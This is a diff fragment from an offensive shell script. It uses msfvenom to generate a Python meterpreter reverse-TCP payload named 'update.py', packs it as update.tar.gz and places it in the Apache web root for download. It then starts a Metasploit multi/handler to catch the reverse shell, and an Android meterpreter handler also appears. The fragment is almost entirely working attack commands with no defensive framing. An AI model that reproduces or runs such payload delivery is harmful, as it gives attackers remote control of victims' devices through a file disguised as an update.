@@ -63,7 +63,9 @@ msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/re
 # 3
 elif [ "$x" == "$py" ]; then                       
 msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/update.py
-	mv /root/Desktop/update.py /var/www/html
+        cd /root/Desktop/
+	tar -czvf update.tar.gz update.py
+	mv /root/Desktop/update.tar.gz /var/www/html
 	systemctl start apache2.service
 echo -e 'Waiting for listener...'
 msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
